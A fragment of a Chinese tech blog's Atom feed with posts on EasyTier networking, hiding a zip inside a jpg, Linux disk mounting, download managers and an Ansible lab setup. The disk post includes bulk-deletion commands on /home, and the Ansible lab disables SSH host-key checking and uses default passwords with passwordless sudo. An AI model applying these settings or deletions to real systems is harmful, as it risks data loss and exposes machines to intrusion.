+    <content type="html"><![CDATA[<p>镜像：<code>easytier/easytier:latest</code></p><p>在创建容器时需要注意两点：</p><p>一是网络要设置为 host 模式，</p><p>二是「命令设置 --&gt; cmd 命令」改成自定义，并填入如下内容：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-string">&#x27;--no-tun&#x27;</span> <span class="hljs-string">&#x27;-d&#x27;</span> <span class="hljs-string">&#x27;--network-name&#x27;</span> <span class="hljs-string">&#x27;foo&#x27;</span> <span class="hljs-string">&#x27;--network-secret&#x27;</span> <span class="hljs-string">&#x27;bar&#x27;</span> <span class="hljs-string">&#x27;-p&#x27;</span> <span class="hljs-string">&#x27;tcp://public.easytier.cn:11010&#x27;</span><br></code></pre></td></tr></table></figure><p>参数说明：</p><ul><li><code>-i &lt;IPV4&gt;</code>: 手动指定 ip</li><li><code>-d</code>: 自动设定 ip，与 <code>-i</code> 二选一</li><li><code>--no-tun</code>: 配置该参数后将不会尝试创建 TUN设备，该节点将无法主动启动对其他节点的访问，不影响被访问</li></ul>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;镜像：&lt;code&gt;easytier/easytier:latest&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;在创建容器时需要注意两点：&lt;/p&gt;
+&lt;p&gt;一是网络要设置为 host 模式，&lt;/p&gt;
+&lt;p&gt;二是「命令设置 --&amp;gt; cmd 命令」改成自定义，并填入如下内容：&lt;/p&gt;
+&lt;f</summary>
+      
+    
+    
+    
+    
+    <category term="内网穿透" scheme="https://blog.oopsky.top/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"/>
+    
+    <category term="异地组网" scheme="https://blog.oopsky.top/tags/%E5%BC%82%E5%9C%B0%E7%BB%84%E7%BD%91/"/>
+    
+    <category term="nas" scheme="https://blog.oopsky.top/tags/nas/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>把压缩包藏到图片里</title>
+    <link href="https://blog.oopsky.top/post/19208f29/"/>
+    <id>https://blog.oopsky.top/post/19208f29/</id>
+    <published>2025-04-09T10:59:53.000Z</published>
+    <updated>2025-04-09T12:22:17.000Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="linux">linux</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> example.jpg example.zip &gt; 1.jpg<br></code></pre></td></tr></table></figure><h3 id="windows">Windows</h3><p>打开 CMD（不能是 PowerShell）</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">copy</span> /b example.jpg + example.zip <span class="hljs-number">2</span>.jpg<br></code></pre></td></tr></table></figure><p>生成的文件可以正常的用各种图片浏览器打开，也可以直接用你的压缩软件打开这个'jpg' 文件，但有些时候可能需要给它加个 <code>.zip</code>后缀才能正常识别，如果你的压缩软件不支持识别这种文件也没关系，后面会提到拆开的办法。</p><hr /><p>看一下生成的文件的校验值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">md5sum</span> *.jpg<br>c6a274f01e3eb53a467bb11a14102fed  1.jpg<br>c6a274f01e3eb53a467bb11a14102fed  2.jpg<br></code></pre></td></tr></table></figure><p>两个平台的结果是一模一样的！</p><p>这个小“魔术”的原理很简单，就是从二进制层面强行把两个文件拼接到一起，但各种软件在默认情况下只能读出来这个缝合怪的第一个部分。没用知识+1</p><p>有合就有分，再来试一下把文件再拆出来吧，以 Linux 上的操作为例：</p><h3 id="拆分linux">拆分（Linux）</h3><p>首先看一下原来图片有多大</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">stat</span> example.jpg<br>  File: example.jpg<br>  Size: 112200   ... ...<br>  ... ...<br></code></pre></td></tr></table></figure><p>喔，是 112200 字节,开搞！</p><p>只把图片拆出来直接可以用 dd 一行搞定。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=2.jpg of=2.1.jpg bs=1 count=112200<br></code></pre></td></tr></table></figure><p>全都拆出来就要用到其他工具了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> <span class="hljs-built_in">split</span><br><span class="hljs-built_in">cd</span> <span class="hljs-built_in">split</span>/<br><span class="hljs-built_in">split</span> -b 112200 ../2.jpg <span class="hljs-comment"># 按照 112200 字节每段，拆分为 xaa 、xab、xac 等一大堆小文件</span><br><span class="hljs-built_in">mv</span> xaa ../2.2.jpg <span class="hljs-comment"># 第一段就是那个图片</span><br><span class="hljs-built_in">cat</span> ./* &gt; ../2.2.zip <span class="hljs-comment"># 其余的按照顺序拼起来就是压缩包</span><br></code></pre></td></tr></table></figure><hr /><p>PS：本文只是以 zip 和 jpg为例，所有的压缩包格式、图片格式理论上都可以使用本文所属方法</p><p>最后的最后，贴一下中间产生的所有文件的校验值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">md5sum</span> ./* | <span class="hljs-built_in">sort</span> -k 1<br>785352af167d67a06bd341617d88d3ab  ./2.2.zip<br>785352af167d67a06bd341617d88d3ab  ./2.zip<br>785352af167d67a06bd341617d88d3ab  ./example.zip<br>7fc687cc6229f5cdd411f9b812bc74c7  ./2.1.jpg<br>7fc687cc6229f5cdd411f9b812bc74c7  ./2.2.jpg<br>7fc687cc6229f5cdd411f9b812bc74c7  ./example.jpg<br>c6a274f01e3eb53a467bb11a14102fed  ./1.jpg<br>c6a274f01e3eb53a467bb11a14102fed  ./2.jpg<br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h3 id=&quot;linux&quot;&gt;linux&lt;/h3&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td cl</summary>
+      
+    
+    
+    
+    
+    <category term="有点意思" scheme="https://blog.oopsky.top/tags/%E6%9C%89%E7%82%B9%E6%84%8F%E6%80%9D/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>方便、够用的异地组网工具 EasyTier</title>
+    <link href="https://blog.oopsky.top/post/cdbffbe9/"/>
+    <id>https://blog.oopsky.top/post/cdbffbe9/</id>
+    <published>2025-04-07T12:24:37.000Z</published>
+    <updated>2025-11-03T00:50:44.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>2019年至今，我使用过许多异地组网工具，ZeroTier、Tailscale、Happyn、VNT。。。</p><p>然而，这些工具在使用过程中都存在一些不顺心的地方，由于国内对跨网的UDP 点对点通信 Qos得很厉害，严重影响可用性；而且这些服务有的不支持自建中转或者自建很麻烦、有的没找到强制走中转的方式、有的官网经常被防火墙拦截。。。这就大大降低了上面提到的这些工具在我这里的使用体验。</p><p>前些时候发现了一个新工具，<ahref="https://github.com/EasyTier/EasyTier">EasyTier</a>，下载下来简单体验了一下后，我感觉这就是我要的组网工具：</p><ul><li>配置简单，自建中转服务也很方便</li><li>默认 P2P 打洞，可在任意客户端随意选择强制走中转，中转协议支持TCP！</li><li>可以很方便的在某个节点引入私网路由</li><li>支持 Windows、Android、Linux 等平台</li></ul><p>另：这个软件的社区目前很活跃，除了 <ahref="https://easytier.cn/guide/download.html">官方的 GUI</a>之外，也可以使用 <ahref="https://github.com/EasyTier/EasytierGame">EasytierGame</a> 或者 <ahref="https://github.com/ldoubil/astral/releases">Astral</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;2019
+年至今，我使用过许多异地组网工具，ZeroTier、Tailscale、Happyn、VNT。。。&lt;/p&gt;
+&lt;p&gt;然而，这些工具在使用过程中都存在一些不顺心的地方，由于国内对跨网的
+UDP 点对点通信 Qos
+得很厉害，严重影响可用性；而且这些服务有的不支持自建中</summary>
+      
+    
+    
+    
+    
+    <category term="内网穿透" scheme="https://blog.oopsky.top/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"/>
+    
+    <category term="异地组网" scheme="https://blog.oopsky.top/tags/%E5%BC%82%E5%9C%B0%E7%BB%84%E7%BD%91/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>向linux系统添加磁盘并挂载</title>
+    <link href="https://blog.oopsky.top/post/894ec163/"/>
+    <id>https://blog.oopsky.top/post/894ec163/</id>
+    <published>2024-11-23T13:33:02.000Z</published>
+    <updated>2024-11-23T13:33:02.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>同事的虚拟机硬盘空间不够用了，下面是我教同事给虚拟机添加硬盘时记录的操作步骤。虽然网上早已有很多相关的教学文章了，但我写都写了，稍作整理水一篇博客岂不美哉o(<em>￣ ▽ ￣</em>) ブ</p><h2 id="添加硬盘">1. 添加硬盘</h2><p>咋添加就不再赘述了 ，添加完硬盘后重启虚拟机，执行 lsblk命令可以发现会多出 sdb、sdc 之类的设备。这就是咱刚才添加的硬盘。</p><h2 id="确认哪些目录需要更大空间">2. 确认哪些目录需要更大空间</h2><p>使用 <code>du --max-depth=1 -h /</code>可查出哪些目录占占空间较多。<br />最终查出来就是这些了：</p><ul><li>/home</li><li>/var<br />…<br />…</li></ul><p>以 home 为例吧</p><h2 id="分区">3. 分区</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@host45:~# fdisk /dev/sdb<br>n<br>疯狂回车<br>w<br></code></pre></td></tr></table></figure><p>解释：</p><ul><li>fdisk：分区工具</li><li>n：在硬盘上新建分区</li><li>疯狂回车：因为是新增空白盘，所以可以大胆的用默认的配置</li><li>w：保存配置，并写入磁盘</li></ul><p>然后在刚才创建的分区上创建 ext4 文件系统<del>（或者说格式化为 ext4文件系统）</del></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@host45:~# mkfs.ext4 /dev/sdb1<br></code></pre></td></tr></table></figure><h2 id="临时挂载">4. 临时挂载</h2><p>创建一个临时目录作为刚才/dev/sdb1 的挂载点 ，并挂载上去。<br /><del>这里直接使用 /mnt/home 了，到第 5 步使用 rsync拷贝数据时会方便点。</del></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@host45:~# <span class="hljs-built_in">mkdir</span>  /mnt/home<br>root@host45:~# mount /dev/sdb1 /mnt/home<br></code></pre></td></tr></table></figure><p>然后再 lsblk 可以看到 sdb1 已被挂载到 /mnt/home</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@host45:~# lsblk<br>NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT<br>sdb      8:16   0   40G  0 disk<br>`-sdb1   8:17   0   40G  0 part /mnt/home<br></code></pre></td></tr></table></figure><h2 id="迁移数据">5. 迁移数据</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@host45:~# rsync -avzuP /home /mnt/<br></code></pre></td></tr></table></figure><p>作用：同步 /home 下的数据 到 /mnt/home</p><p>可以再多执行几次<code>rsync -avzuP /home /mnt/</code>，已被拷贝的不会重新拷贝。<del>（不多执行应该也没啥问题，但多执行几次更稳妥一些，突出一个稳健）</del></p><p>再执行几次 sync 倒一下缓存。<del>（理由同上）</del></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@host45:~# <span class="hljs-built_in">sync</span><br>root@host45:~# <span class="hljs-built_in">sync</span><br></code></pre></td></tr></table></figure><h2 id="清理掉原来的文件">6. 清理掉原来的文件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@host45:~# find /home -<span class="hljs-built_in">type</span> f -delete<br></code></pre></td></tr></table></figure><p><del>用 <code>rm -rf /home/*</code>也行</del>，这俩命令都<strong>很危险，执行务必前看清楚敲对了没</strong>，别把<code>/</code> 给清了。</p><h2 id="持久化挂载">7. 持久化挂载</h2><p>编辑 /etc/fstab，在末尾新建一行添加：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/dev/sdb1 /home auto auto 0 0<br></code></pre></td></tr></table></figure><p>说明：</p><ul><li><code>/dev/sdb1</code>：哪个分区</li><li><code>/home</code>：挂载到哪</li><li><code>auto auto 0 0</code>：不知道该咋写就这样写就没毛病，通用默认配置</li></ul><h2 id="重启">8. 重启</h2><p>重启前注意下，第 7步如果写错，充启后可能会进不去操作系统！<del>进安全模式或者单用户模式啥的修改fstab文件可解，但不是本文内容了，网络上有很多相关文章，可自行搜索</del></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">reboot<br></code></pre></td></tr></table></figure><p>重新进入系统后你会发现，空间又够用啦~</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;同事的虚拟机硬盘空间不够用了，下面是我教同事给虚拟机添加硬盘时记录的操作步骤。虽然网上早已有很多相关的教学文章了，但我写都写了，稍作整理水一篇博客岂不美哉
+o(&lt;em&gt;￣ ▽ ￣&lt;/em&gt;) ブ&lt;/p&gt;
+&lt;h2 id=&quot;添加硬盘&quot;&gt;1. 添加硬盘&lt;/h2&gt;
+&lt;p&gt;咋添加就不</summary>
+      
+    
+    
+    
+    
+    <category term="linux" scheme="https://blog.oopsky.top/tags/linux/"/>
+    
+    <category term="fdisk" scheme="https://blog.oopsky.top/tags/fdisk/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>终于找到IDM的完美平替了</title>
+    <link href="https://blog.oopsky.top/post/cb5432d2/"/>
+    <id>https://blog.oopsky.top/post/cb5432d2/</id>
+    <published>2024-10-12T11:13:42.000Z</published>
+    <updated>2025-04-30T22:58:39.000Z</updated>
+    
+    <content type="html"><![CDATA[<p><del>推荐一个免费下载工具：<ahref="https://neatdownloadmanager.com">NeatDownloadManager</a>。除了界面有点简陋，整体用着跟idm 差不多，前两天找了一堆，一个一个试的，这个综合体验最好。</del></p><p><strong>现在 <a href="https://abdownloadmanager.com/">AB DownloadManager</a> 是最带劲的了</strong></p><p>选出来几个做下简单对比：</p><ul><li><a href="https://gopeed.com">Gopeed</a><ul><li>支持浏览器插件自动唤起下载</li><li>支持 HTTP、BitTorrent、Magnet 等协议</li><li>支持 Windows、MacOS、Linux、Android、iOS 等</li><li>目前版本 (1.6.x) 对某些中文文件名识别有问题，下载下来后文件名是urlencode 过的，需要手动重命名</li></ul></li><li><a href="https://abdownloadmanager.com/">AB Download Manager</a><ul><li>支持浏览器插件自动唤起下载</li><li>支持按照文件后缀分类并下载到不同子目录</li><li>界面挺精致的</li><li>支持 Windows、Linux</li><li><del>目前版本 (1.1.0) 不支持配置代理</del><strong>最新版本已支持</strong></li></ul></li><li><a href="https://neatdownloadmanager.com">NeatDownloadManager</a><ul><li>支持浏览器插件自动唤起下载</li><li>支持配置代理</li><li>支持按照文件后缀分类并下载到不同子目录</li><li>支持 HTTP 和 FTP 协议。</li><li>支持 Windows、MacOS</li></ul></li></ul>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;del&gt;推荐一个免费下载工具：&lt;a
+href=&quot;https://neatdownloadmanager.com&quot;&gt;NeatDownloadManager&lt;/a&gt;。除了界面有点简陋，整体用着跟
+idm 差不多，前两天找了一堆，一个一个试的，这个综合体验最好。&lt;/del&gt;&lt;/</summary>
+      
+    
+    
+    
+    
+    <category term="windows" scheme="https://blog.oopsky.top/tags/windows/"/>
+    
+    <category term="tools" scheme="https://blog.oopsky.top/tags/tools/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>在 Linux 上安装配置 Ansible</title>
+    <link href="https://blog.oopsky.top/post/7574f282/"/>
+    <id>https://blog.oopsky.top/post/7574f282/</id>
+    <published>2024-07-11T13:21:21.000Z</published>
+    <updated>2024-07-11T13:21:21.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="安装-ansible">安装 Ansible</h2><p>首先创建我们接下来学习 Ansible 过程中使用的工作目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> -p ~/ansible_playground<br></code></pre></td></tr></table></figure><p>使用各家包管理器安装或使用 pip 安装均可，以 pip 为例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> ~/ansible_playground<br>python3 -m venv venv <span class="hljs-comment"># 创建 venv 环境（可选）</span><br><span class="hljs-built_in">source</span> venv/bin/activate <span class="hljs-comment"># 生效该环境（可选）</span><br>pip install ansible<br></code></pre></td></tr></table></figure><p>使用这种方式安装的 ansible 在每次使用前都需要执行<code>source venv/bin/activate</code> 切换一下环境。</p><h2 id="创建-ansible-配置">创建 ansible 配置</h2><p>在工作目录下创建 ansible 配置文件 <code>ansible.cfg</code>：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-comment"># ~/ansible_playground/ansible.cfg</span><br>[<span class="hljs-string">defaults</span>]<br><span class="hljs-string">inventory=hosts</span><br></code></pre></td></tr></table></figure><p>这里的 <code>hosts</code> 是受控设备清单，下面会提到。</p><h2 id="修改-ssh-配置">修改 ssh 配置</h2><p>只需要在安装了 ansible 的设备上修改，不改也行，我是因为每次重新使用docker 建立容器后 key都会变化，以至于每次都要求我重新确认，实在让人恼火才改的 hhh。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># /etc/ssh/ssh_config</span><br>StrictHostKeyChecking no<br><span class="hljs-comment"># 当设置为 `yes` 时，SSH 客户端会严格检查主机密钥，如果主机密钥发生变化或未知，则连接会被拒绝并提示密钥不匹配的错误信息。</span><br><span class="hljs-comment"># 如果设置为 `no`，则 SSH 客户端会自动接受新的主机密钥，而不会提示错误信息。</span><br></code></pre></td></tr></table></figure><h2 id="建立试验场">建立试验场</h2><p>我原本打算开一个虚拟机作为受控设备，突然想到可以用 docker实现这个需求，好处是随用随开，且开销极低，<del>只是练习的话这么搞应该是没啥问题的。</del><strong>涉及到部署服务还是得虚拟机，在容器里折腾systemd 有点蛋疼且不够清真。</strong></p><p>下面是 Dockerfile：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> ubuntu:latest<br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> apt-get update &amp;&amp; apt-get install openssh-server <span class="hljs-built_in">sudo</span> rsync -y</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;root:root&#x27;</span> | chpasswd</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;PermitRootLogin yes&#x27;</span> &gt;&gt; /etc/ssh/sshd_config</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;UseDNS no&#x27;</span> &gt;&gt; /etc/ssh/sshd_config</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> userdel ubuntu &amp;&amp; <span class="hljs-built_in">rm</span> -rf /home/ubuntu</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> useradd -m -s /bin/bash -g root -G <span class="hljs-built_in">sudo</span> -u 1000 idea</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;idea:idea&#x27;</span> | chpasswd</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;idea ALL=(ALL) NOPASSWD: ALL&#x27;</span> | <span class="hljs-built_in">tee</span> -a /etc/sudoers</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> service ssh start</span><br><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">22</span> <span class="hljs-number">80</span><br><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;/usr/sbin/sshd&quot;</span>,<span class="hljs-string">&quot;-D&quot;</span>]</span><br></code></pre></td></tr></table></figure><p>然后可以构建镜像，并测试是否可用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 构建镜像</span><br>docker build -t ubuntu:ssh .<br><br><span class="hljs-comment"># 批量创建容器</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> 1 2; <span class="hljs-keyword">do</span> docker run -d --name ubuntu_ssh_<span class="hljs-variable">$i</span> -p 300<span class="hljs-variable">$i</span>:22 -p 808<span class="hljs-variable">$i</span>:80 ubuntu:ssh; <span class="hljs-keyword">done</span>;<br><br><span class="hljs-comment"># 测试是否可用</span><br>ssh ssh://idea@127.0.0.1:3001<br></code></pre></td></tr></table></figure><h2 id="编辑受控设备清单">编辑受控设备清单</h2><p>根据上面创建的容器的端口等信息编写 <code>hosts</code> 文件：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment"># ~/ansible_playground/hosts</span><br><span class="hljs-section">[ubuntu_idea]</span><br>vm1 <span class="hljs-attr">ansible_ssh_host</span>=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> ansible_ssh_user=<span class="hljs-string">&#x27;idea&#x27;</span> ansible_ssh_port=<span class="hljs-number">3001</span> ansible_ssh_pass=<span class="hljs-string">&#x27;idea&#x27;</span><br><span class="hljs-section">[ubuntu_root]</span><br>vm2 <span class="hljs-attr">ansible_ssh_host</span>=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> ansible_ssh_user=<span class="hljs-string">&#x27;root&#x27;</span> ansible_ssh_port=<span class="hljs-number">3002</span> ansible_ssh_pass=<span class="hljs-string">&#x27;root&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="测试">测试</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">[idea@archlinux ansible_playground]$ ansible all -m ping<br>vm2 | SUCCESS =&gt; &#123;<br>    <span class="hljs-string">&quot;changed&quot;</span>: <span class="hljs-literal">false</span>,<br>    <span class="hljs-string">&quot;ping&quot;</span>: <span class="hljs-string">&quot;pong&quot;</span><br>&#125;<br>vm1 | SUCCESS =&gt; &#123;<br>    <span class="hljs-string">&quot;changed&quot;</span>: <span class="hljs-literal">false</span>,<br>    <span class="hljs-string">&quot;ping&quot;</span>: <span class="hljs-string">&quot;pong&quot;</span><br>&#125;<br><br>[idea@archlinux ansible_playground]$ ansible ubuntu_idea -m shell -a <span class="hljs-string">&#x27;cat /etc/hostname&#x27;</span><br>vm2 | CHANGED | rc=0 &gt;&gt;<br>1b6f5bc4d9a2<br>vm1 | CHANGED | rc=0 &gt;&gt;<br>4c74b855f4a1<br></code></pre></td></tr></table></figure><p>成功了🎉</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;安装-ansible&quot;&gt;安装 Ansible&lt;/h2&gt;
+&lt;p&gt;首先创建我们接下来学习 Ansible 过程中使用的工作目录&lt;/p&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;</summary>
+      
+    
+    
+    
+    
+    <category term="linux" scheme="https://blog.oopsky.top/tags/linux/"/>
+    
+    <category term="ansible" scheme="https://blog.oopsky.top/tags/ansible/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>将评论系统迁移到 Twikoo 了</title>
+    <link href="https://blog.oopsky.top/post/e33ba8b8/"/>
+    <id>https://blog.oopsky.top/post/e33ba8b8/</id>
+    <published>2024-06-12T14:39:29.000Z</published>
+    <updated>2024-06-12T14:39:29.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>之前用的评论系统是 giscus，依赖 Github 的 Discussions功能，想评论必须要有 Github 账号才行，感觉不太方便。</p><p>刚才花了几十分钟尝试了几种评论系统，最终选择了 Twikoo。</p><p>现在可以无障碍地评论了。</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;之前用的评论系统是 giscus，依赖 Github 的 Discussions
+功能，想评论必须要有 Github 账号才行，感觉不太方便。&lt;/p&gt;
+&lt;p&gt;刚才花了几十分钟尝试了几种评论系统，最终选择了 Twikoo。&lt;/p&gt;
+&lt;p&gt;现在可以无障碍地评论了。&lt;/p&gt;
+</summary>
+      
+    
+    
+    
+    
+    <category term="twikoo" scheme="https://blog.oopsky.top/tags/twikoo/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>虚拟机软件中常用的几种网卡的区别</title>
+    <link href="https://blog.oopsky.top/post/98ac915d/"/>
+    <id>https://blog.oopsky.top/post/98ac915d/</id>
+    <published>2024-05-18T12:37:36.000Z</published>
+    <updated>2024-06-18T03:40:15.000Z</updated>
+    
+    <content type="html"><![CDATA[<ul><li>VMware Workstation<ul><li>NAT：可上网，虚拟机/宿主机可互访</li><li>桥接：可上网，虚拟机内外可互访，和宿主机同网络的其他设备也可以访问需该虚拟机</li><li>仅主机（Host-Only）：不可上网，虚拟机/宿主机可互访</li></ul></li><li>Virtual Box<ul><li>NAT：可上网，虚拟机可访问宿主机，反之不行。</li><li>桥接：可上网，虚拟机/宿主机可互访，和宿主机同网络的其他设备也可以访问需该虚拟机</li><li>仅主机（Host-Only）：不可上网，虚拟机/宿主机可互访。</li></ul></li></ul><hr /><p>如果需要虚拟机/宿主机互相访问对方提供的网络服务，同时虚拟机也能上网：</p><ul><li>VMware Workstation 可直接使用 NAT 模式网卡或桥接模式网卡。<br /></li><li>Virtual Box 需要使用桥接模式网卡；或者给虚拟机添加两个网卡，一个NAT，一个仅主机。</li></ul><p>桥接模式网卡是最通用的，但如果物理网卡上没网络的话可能会有问题；<br />懒得折腾就不论啥虚拟机软件都直接给虚拟机添加两个网卡，一个NAT，一个仅主机。</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;ul&gt;
+&lt;li&gt;VMware Workstation
+&lt;ul&gt;
+&lt;li&gt;NAT：可上网，虚拟机/宿主机可互访&lt;/li&gt;
+&lt;li&gt;桥接：可上网，虚拟机内外可互访，和宿主机同网络的其他设备也可以访问需该虚拟机&lt;/li&gt;
+&lt;li&gt;仅主机（Host-Only）：不可上网，虚拟机/宿主机</summary>
+      
+    
+    
+    
+    
+    <category term="virtualbox" scheme="https://blog.oopsky.top/tags/virtualbox/"/>
+    
+    <category term="vmware" scheme="https://blog.oopsky.top/tags/vmware/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>在 Windows CMD 中为某命令设置别名</title>
+    <link href="https://blog.oopsky.top/post/59f07d80/"/>
+    <id>https://blog.oopsky.top/post/59f07d80/</id>
